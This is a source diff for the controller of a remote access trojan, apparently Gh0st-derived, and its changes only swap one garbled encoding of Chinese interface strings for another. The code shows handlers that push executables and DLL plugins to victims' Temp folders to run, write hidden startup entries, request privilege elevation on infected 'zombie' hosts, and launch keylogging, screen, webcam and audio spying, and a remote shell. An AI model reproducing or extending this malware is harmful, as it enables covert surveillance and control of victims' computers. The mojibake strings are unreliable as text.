@@ -1515,13 +1524,13 @@ void CClientView::OnUpdateServer()
 void CClientView::OnOpenUrlHide() 
 {
 	// TODO: Add your command handler code here
-	OnOpenUrl("è¿œç¨‹æ‰“å¼€ç½‘å€ï¼š","è¯·è¾“å…¥è¦ï¼ˆéšè—ï¼‰è®¿é—®çš„ç½‘å€:",COMMAND_OPEN_URL_HIDE);
+	OnOpenUrl("Ô¶³Ì´ò¿ªÍøÖ·£º","ÇëÊäÈëÒª£¨Òþ²Ø£©·ÃÎÊµÄÍøÖ·:",COMMAND_OPEN_URL_HIDE);
 }
 
 void CClientView::OnOpenUrlShow() 
 {
 	// TODO: Add your command handler code here
-	OnOpenUrl("è¿œç¨‹æ‰“å¼€ç½‘å€ï¼š","è¯·è¾“å…¥è¦ï¼ˆæ˜¾ç¤ºï¼‰è®¿é—®çš„ç½‘å€:",COMMAND_OPEN_URL_SHOW);
+	OnOpenUrl("Ô¶³Ì´ò¿ªÍøÖ·£º","ÇëÊäÈëÒª£¨ÏÔÊ¾£©·ÃÎÊµÄÍøÖ·:",COMMAND_OPEN_URL_SHOW);
 }
 
 TCHAR FileOpenPath[MAX_PATH];
@@ -1534,7 +1543,7 @@ char *CClientView::OnOpenFileName()
 	ofn.lpstrFile = FileOpenPath;
 	ofn.lpstrFile[0] = _T('\0');
 	ofn.nMaxFile = sizeof(FileOpenPath);
-	ofn.lpstrFilter = _T("å¯æ‰§è¡Œæ–‡ä»¶(*.exe)\0*.exe\0æ‰¹å¤„ç†æ–‡ä»¶(*.bat)\0*.bat\0æ‰€æœ‰æ–‡ä»¶(*.*)\0*.*\0\0");
+	ofn.lpstrFilter = _T("¿ÉÖ´ÐÐÎÄ¼þ(*.exe)\0*.exe\0Åú´¦ÀíÎÄ¼þ(*.bat)\0*.bat\0ËùÓÐÎÄ¼þ(*.*)\0*.*\0\0");
 	ofn.nFilterIndex = 1;
 	ofn.lpstrFileTitle = NULL;
 	ofn.nMaxFileTitle = 0;
@@ -1558,7 +1567,7 @@ char *CClientView::OnOpenFileDll()
 	ofn.lpstrFile = FileOpenPath;
 	ofn.lpstrFile[0] = _T('\0');
 	ofn.nMaxFile = sizeof(FileOpenPath);
-	ofn.lpstrFilter = _T("æ’ä»¶æ–‡ä»¶(*.dll*)\0*.dll\0\0");
+	ofn.lpstrFilter = _T("²å¼þÎÄ¼þ(*.dll*)\0*.dll\0\0");
 	ofn.nFilterIndex = 1;
 	ofn.lpstrFileTitle = NULL;
 	ofn.nMaxFileTitle = 0;
@@ -1578,7 +1587,7 @@ void CClientView::OnStartHide()
 	// TODO: Add your command handler code here
 	CString strTitle;
 	
-	if (MessageBox("ä¸Šä¼ è‡³è¿œç¨‹ç³»ç»ŸTempæ–‡ä»¶å¤¹ä¸‹ï¼Œä¼ è¾“æ–‡ä»¶è¿‡å¤§æ—¶ï¼Œ\nè¯·è€å¿ƒç­‰å€™ï¼", "æç¤º! ", MB_YESNO|MB_ICONWARNING) == IDNO)
+	if (MessageBox("ÉÏ´«ÖÁÔ¶³ÌÏµÍ³TempÎÄ¼þ¼ÐÏÂ£¬´«ÊäÎÄ¼þ¹ý´óÊ±£¬\nÇëÄÍÐÄµÈºò£¡", "ÌáÊ¾! ", MB_YESNO|MB_ICONWARNING) == IDNO)
 		return;
 	
 	char *lpFilePath = OnOpenFileName();
@@ -1591,7 +1600,7 @@ void CClientView::OnStartHide()
 	FILE *file=fopen(lpFilePath,"rb");
 	if (file == NULL)   
 	{   
-		AfxMessageBox("æ–‡ä»¶è¯»å–å¤±è´¥ï¼");  
+		AfxMessageBox("ÎÄ¼þ¶ÁÈ¡Ê§°Ü£¡");  
 		return;  
 	}
 	fseek(file, 0, SEEK_END);   
@@ -1619,7 +1628,7 @@ void CClientView::OnStartShow()
 	// TODO: Add your command handler code here
 	CString strTitle;
 	
-	if (MessageBox("ä¸Šä¼ è‡³è¿œç¨‹ç³»ç»ŸTempæ–‡ä»¶å¤¹ä¸‹ï¼Œä¼ è¾“æ–‡ä»¶è¿‡å¤§æ—¶ï¼Œ\nè¯·è€å¿ƒç­‰å€™ï¼", "æç¤º! ", MB_YESNO|MB_ICONWARNING) == IDNO)
+	if (MessageBox("ÉÏ´«ÖÁÔ¶³ÌÏµÍ³TempÎÄ¼þ¼ÐÏÂ£¬´«ÊäÎÄ¼þ¹ý´óÊ±£¬\nÇëÄÍÐÄµÈºò£¡", "ÌáÊ¾! ", MB_YESNO|MB_ICONWARNING) == IDNO)
 		return;
 	
 	char *lpFilePath = OnOpenFileName();
@@ -1632,7 +1641,7 @@ void CClientView::OnStartShow()
 	FILE *file=fopen(lpFilePath,"rb");
 	if (file == NULL)   
 	{   
-		AfxMessageBox("æ–‡ä»¶è¯»å–å¤±è´¥ï¼");  
+		AfxMessageBox("ÎÄ¼þ¶ÁÈ¡Ê§°Ü£¡");  
 		return;  
 	}
 	fseek(file, 0, SEEK_END);   
@@ -1660,7 +1669,7 @@ void CClientView::OnStartNRun()
 	// TODO: Add your command handler code here
 	CString strTitle;
 	
-	if (MessageBox("æ‰‹åŠ¨ä¸Šä¼ æ’ä»¶è‡³è¿œç¨‹ç³»ç»ŸTempæ–‡ä»¶å¤¹ä¸‹ï¼Œ\nè¯·è€å¿ƒç­‰å€™ï¼", "æç¤º! ", MB_YESNO|MB_ICONWARNING) == IDNO)
+	if (MessageBox("ÊÖ¶¯ÉÏ´«²å¼þÖÁÔ¶³ÌÏµÍ³TempÎÄ¼þ¼ÐÏÂ£¬\nÇëÄÍÐÄµÈºò£¡", "ÌáÊ¾! ", MB_YESNO|MB_ICONWARNING) == IDNO)
 		return;
 	
 	char *lpFilePath = OnOpenFileDll();
@@ -1673,7 +1682,7 @@ void CClientView::OnStartNRun()
 	FILE *file=fopen(lpFilePath,"rb");
 	if (file == NULL)   
 	{   
-		AfxMessageBox("æ–‡ä»¶è¯»å–å¤±è´¥ï¼");  
+		AfxMessageBox("ÎÄ¼þ¶ÁÈ¡Ê§°Ü£¡");  
 		return;  
 	}
 	fseek(file, 0, SEEK_END);   
@@ -1745,11 +1754,11 @@ void CClientView::OnRenameRemark()
 	
 	CString strTitle;
 	if (m_pListCtrl->GetSelectedCount() == 1)
-		strTitle.Format(_T("æ›´æ”¹ä¸»æœº(%s)çš„å¤‡æ³¨"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
+		strTitle.Format(_T("¸ü¸ÄÖ÷»ú(%s)µÄ±¸×¢"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
 	else
-		strTitle = _T("æ‰¹é‡æ›´æ”¹ä¸»æœºå¤‡æ³¨");
+		strTitle = _T("ÅúÁ¿¸ü¸ÄÖ÷»ú±¸×¢");
 	CInputDialog	dlg;
-	dlg.Init(strTitle, _T("è¯·è¾“å…¥æ–°çš„å¤‡æ³¨:"), this);
+	dlg.Init(strTitle, _T("ÇëÊäÈëÐÂµÄ±¸×¢:"), this);
 	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
 		return;
 	
@@ -1788,7 +1797,7 @@ struct MSGBOX
 	UINT Type;
 }MsgBox;
 
-void CClientView::OnShowMsg()   //æ¶ˆæ¯å‘é€
+void CClientView::OnShowMsg()   //ÏûÏ¢·¢ËÍ
 {
 	// TODO: Add your command handler code here
 	
@@ -1799,7 +1808,7 @@ remsg:
 	
 	if ((strlen(dlg.m_Title) < 1) | (strlen(dlg.m_Text) < 1))
 	{
-		MessageBox("è¯·è¾“å…¥å‘é€æ ‡é¢˜åŠå†…å®¹!!!", "æç¤º", MB_OK | MB_ICONWARNING);
+		MessageBox("ÇëÊäÈë·¢ËÍ±êÌâ¼°ÄÚÈÝ!!!", "ÌáÊ¾", MB_OK | MB_ICONWARNING);
 		goto remsg;
 	}
 	
@@ -1817,11 +1826,11 @@ remsg:
 	goto remsg;
 }
 
-////////////////////////////////////////å…ˆè¯•è¯•
+////////////////////////////////////////ÏÈÊÔÊÔ
 void CClientView::OnIPList() 
 {
 	// TODO: Add your command handler code here
-	CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("æ–‡æœ¬æ–‡ä»¶|*.txt"), NULL);
+	CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("ÎÄ±¾ÎÄ¼þ|*.txt"), NULL);
 	if (dlg.DoModal() != IDOK)
 		return;
 	CFile file;
@@ -1837,7 +1846,7 @@ void CClientView::OnIPList()
 			file.Write(strTitle, strlen(strTitle));
 		}
 		file.Close();
-		AfxMessageBox(_T("IPåˆ—è¡¨å¯¼å‡ºæˆåŠŸ!"));
+		AfxMessageBox(_T("IPÁÐ±íµ¼³ö³É¹¦!"));
 	}
 }
 
@@ -1964,7 +1973,7 @@ LRESULT CClientView::OnOpenSysInfoDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CSysInfo	*dlg = new CSysInfo(this, m_iocpServer, pContext);
 	
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -1977,7 +1986,7 @@ LRESULT CClientView::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
-	//Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	//Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	pContext->m_Dialog[0] = REGEDIT_DLG;
@@ -1990,7 +1999,7 @@ LRESULT CClientView::OnOpenSerManagerDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CSerManager	*dlg = new CSerManager(this, m_iocpServer, pContext);
 	
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_SERMANA, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -2004,7 +2013,7 @@ LRESULT CClientView::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CChat	*dlg = new CChat(this, m_iocpServer, pContext);
 	
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_CHAT, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -2018,7 +2027,7 @@ LRESULT CClientView::OnOpenQQInfoDialog(WPARAM wParam, LPARAM lParam)
 	ClientContext	*pContext = (ClientContext *)lParam;
 	CQQInfoDlg	*dlg = new CQQInfoDlg(this, m_iocpServer, pContext);
 	
-	// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+	// Settings¸¸´°¿ÚÎª×ÀÃæ
 	dlg->Create(IDD_QQINFO, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 	
@@ -2042,7 +2051,7 @@ void CClientView::OnModifyListYN(LPARAM lParam,CHAR *strp)
 	{
 		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
 		int num = pView->m_pListCtrl->GetItemCount();
-		newnum = newnum + num ;//èŽ·å–æ€»å…±ä¸»æœº
+		newnum = newnum + num ;//»ñÈ¡×Ü¹²Ö÷»ú
 	}
 	for (int n = 0; n < nTabs; n++ )
 	{
@@ -2062,7 +2071,7 @@ void CClientView::OnModifyListYN(LPARAM lParam,CHAR *strp)
 
 LRESULT CClientView::OnModifyList(WPARAM wParam, LPARAM lParam)
 {	
-	OnModifyListYN(lParam," æœ‰");
+	OnModifyListYN(lParam," ÓÐ");
 	return 0;
 }
 
@@ -2075,13 +2084,13 @@ LRESULT CClientView::OnNoModifyList(WPARAM wParam, LPARAM lParam)
 void CClientView::OnSortProcess() 
 {
 	CInputDialog	dlg;
-	dlg.Init(_T("è¿›ç¨‹ç­›é€‰"), _T("è¯·è¾“å…¥è¦ç­›é€‰çš„è¿›ç¨‹:(.exe)"), this);
+	dlg.Init(_T("½ø³ÌÉ¸Ñ¡"), _T("ÇëÊäÈëÒªÉ¸Ñ¡µÄ½ø³Ì:(.exe)"), this);
 	if (dlg.DoModal() != IDOK)   
 		return;
 	dlg.m_str.MakeLower();
 	if (dlg.m_str.Find(_T(".exe")) == -1)
 	{
-		MessageBox(_T("è¾“å…¥çš„åç§°ä¸åˆæ³•"), _T("é”™è¯¯"));
+		MessageBox(_T("ÊäÈëµÄÃû³Æ²»ºÏ·¨"), _T("´íÎó"));
 		return;
 	}
 	
@@ -2098,13 +2107,13 @@ void CClientView::OnSortProcess()
 void CClientView::OnSortWindow() 
 {
 	CInputDialog	dlg;
-	dlg.Init(_T("çª—ä½“ç­›é€‰"), _T("è¯·è¾“å…¥è¦ç­›é€‰çš„æ ‡é¢˜å…³é”®å­—:"), this);
+	dlg.Init(_T("´°ÌåÉ¸Ñ¡"), _T("ÇëÊäÈëÒªÉ¸Ñ¡µÄ±êÌâ¹Ø¼ü×Ö:"), this);
 	if (dlg.DoModal() != IDOK)   
 		return;
 	dlg.m_str.MakeLower();
 	if (lstrlen(dlg.m_str) < 1)
 	{
-		MessageBox(_T("è¾“å…¥çš„åç§°ä¸åˆæ³•"), _T("é”™è¯¯"));
+		MessageBox(_T("ÊäÈëµÄÃû³Æ²»ºÏ·¨"), _T("´íÎó"));
 		return;
 	}
 	
@@ -2141,7 +2150,7 @@ void CClientView::OnMap()
 		pContext= (ClientContext*)m_pListCtrl->GetItemData(nItem);
 		
 		CMapDlg	*dlg = new CMapDlg(this, nItem, pContext);
-		// Settingsçˆ¶çª—å£ä¸ºæ¡Œé¢
+		// Settings¸¸´°¿ÚÎª×ÀÃæ
 		dlg->Create(IDD_MAP_DIALOG, GetDesktopWindow());
 		//dlg->ShowWindow(SW_SHOW);
 		
@@ -2157,47 +2166,47 @@ void CClientView::OnLButtonDblClk(UINT nFlags, CPoint point)
 	CListView::OnLButtonDblClk(nFlags, point);
 }
 
-// å¤„ç†åŒå‡»äº‹ä»¶
+// ´¦ÀíË«»÷ÊÂ¼þ
 void CClientView::TestDbClick(void)
 {
 	//operate=1;
 	switch(operate)
 	{
 	case 0:
-		OnFileManager();        //æ–‡ä»¶ç®¡ç†
+		OnFileManager();        //ÎÄ¼þ¹ÜÀí
 		break;
 	case 1:
-		OnKeyboard();           //é”®ç›˜è®°å½•
+		OnKeyboard();           //¼üÅÌ¼ÇÂ¼
 		break;
 	case 2:
-		OnScreenspy();          //è¿œç¨‹æ¡Œé¢
+		OnScreenspy();          //Ô¶³Ì×ÀÃæ
 		break;
 	case 3:
-		OnSystem();             //ç³»ç»Ÿç®¡ç†
+		OnSystem();             //ÏµÍ³¹ÜÀí
 		break;
 	case 4:
-		OnWebcam();             //è§†é¢‘æŸ¥çœ‹
+		OnWebcam();             //ÊÓÆµ²é¿´
 		break;
 	case 5:
-		OnAudioListen();        //è¯­éŸ³ç›‘å¬
+		OnAudioListen();        //ÓïÒô¼àÌý
 		break;
 	case 6:
-		OnRemoteShell();        //è¿œç¨‹ç»ˆç«¯
+		OnRemoteShell();        //Ô¶³ÌÖÕ¶Ë
 		break;
 	case 7:
-		OnSysinfo();            //ä¸»æœºç®¡ç†
+		OnSysinfo();            //Ö÷»ú¹ÜÀí
 		break;
 	case 8:
-		OnSerManager();         //æœåŠ¡ç®¡ç†
+		OnSerManager();         //·þÎñ¹ÜÀí
 		break;
 	case 9:
-		OnRegedit();            //æŸ¥æ³¨å†Œè¡¨
+		OnRegedit();            //²é×¢²á±í
 		break;
 	case 10:
-		OnChat();               //è¿œç¨‹äº¤è°ˆ
+		OnChat();               //Ô¶³Ì½»Ì¸
 		break;
 	case 11:
-		OnMap();                //è¿œç¨‹å®šä½
+		OnMap();                //Ô¶³Ì¶¨Î»
 		break;
 	}
 }
@@ -2205,15 +2214,15 @@ void CClientView::TestDbClick(void)
 struct START
 {
 	CHAR Startname[200];
-	WORD FileAttribute;      //æ–‡ä»¶å±žæ€§	
-	WORD Enlarge;            //å®‰è£…å¢žå¤§
+	WORD FileAttribute;      //ÎÄ¼þÊôÐÔ	
+	WORD Enlarge;            //°²×°Ôö´ó
 }Start;
 void CClientView::OnStart() 
 {
 	// TODO: Add your command handler code here
 	if (m_pListCtrl->GetSelectedCount() < 1)
 	{
-		MessageBox("è¯·é€‰æ‹©ä¸»æœºï¼");
+		MessageBox("ÇëÑ¡ÔñÖ÷»ú£¡");
 		return ;	
 	}
 	
@@ -2221,7 +2230,7 @@ void CClientView::OnStart()
 	if (pos==NULL)
 		return;
 	
-	if (MessageBox(_T("ç¡®å®šå†™å¯åŠ¨é¡¹å—ï¼Ÿå®‰å…¨è½¯ä»¶å¯èƒ½ä¼šæ‹¦æˆªï¼ï¼ï¼"), _T("æç¤º"), MB_YESNO | MB_ICONWARNING) == IDNO)
+	if (MessageBox(_T("È·¶¨Ð´Æô¶¯ÏîÂð£¿°²È«Èí¼þ¿ÉÄÜ»áÀ¹½Ø£¡£¡£¡"), _T("ÌáÊ¾"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 	
 	CStart dlg;
@@ -2231,7 +2240,7 @@ one:
 	
 	if ((strlen(dlg.m_StartName) < 1))
 	{
-		MessageBox("è¯·è¾“å…¥æ–‡ä»¶åç§°!!... ", "æç¤º! ", MB_OK | MB_ICONWARNING);
+		MessageBox("ÇëÊäÈëÎÄ¼þÃû³Æ!!... ", "ÌáÊ¾! ", MB_OK | MB_ICONWARNING);
 		goto one;
 	}
 	
@@ -2242,21 +2251,21 @@ one:
 	
 	
 	
-	if(rString == "æ­£å¸¸")
+	if(rString == "Õý³£")
 		Start.FileAttribute = FILE_ATTRIBUTE_NORMAL;
-	if(rString == "éšè—")
+	if(rString == "Òþ²Ø")
 		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN;
 	
-	if(rString == "ç³»ç»Ÿ")
+	if(rString == "ÏµÍ³")
 		Start.FileAttribute = FILE_ATTRIBUTE_SYSTEM;
 	
-	if(rString == "åªè¯»")
+	if(rString == "Ö»¶Á")
 		Start.FileAttribute = FILE_ATTRIBUTE_READONLY;
 	
-	if(rString == "éšè—+ç³»ç»Ÿ")
+	if(rString == "Òþ²Ø+ÏµÍ³")
 		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
 	
-	if(rString == "éšè—+ç³»ç»Ÿ+åªè¯»")
+	if(rString == "Òþ²Ø+ÏµÍ³+Ö»¶Á")
 		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;
 	
 	Start.Enlarge=(WORD)dlg.m_Enlarge;
@@ -2290,15 +2299,15 @@ void CClientView::OnMenuitemProxyMap()
 	SendSelectCommand(&bToken, sizeof(BYTE));
 	LocalFree((LPBYTE)&bToken);
 }
-void CClientView::OnElevate_Privileges() //WIN7æå‡æƒé™
+void CClientView::OnElevate_Privileges() //WIN7ÌáÉýÈ¨ÏÞ
 {
-	if(MessageBox("è‚‰é¸¡åœ¨UACç­‰çº§ä¸‹éžç®¡ç†å‘˜è´¦æˆ·ææƒä¼šå¼¹å‡ºè¯¢é—®æ¡†\r\næ˜¯å¦ææƒï¼Ÿ", "æ³¨æ„", MB_ICONQUESTION|MB_YESNO) != IDYES)
+	if(MessageBox("Èâ¼¦ÔÚUACµÈ¼¶ÏÂ·Ç¹ÜÀíÔ±ÕË»§ÌáÈ¨»áµ¯³öÑ¯ÎÊ¿ò\r\nÊÇ·ñÌáÈ¨£¿", "×¢Òâ", MB_ICONQUESTION|MB_YESNO) != IDYES)
 		return ;
 	
 	BYTE	bToken = COMMAND_OnElevate_Privileges;
 	SendSelectCommand(&bToken, sizeof(BYTE));
 }
-void CClientView::OnReStartexp() //é‡å¯Exp
+void CClientView::OnReStartexp() //ÖØÆôExp
 {
 	BYTE	bToken = COMMAND_ReStart_Exp;
 	SendSelectCommand(&bToken, sizeof(BYTE));
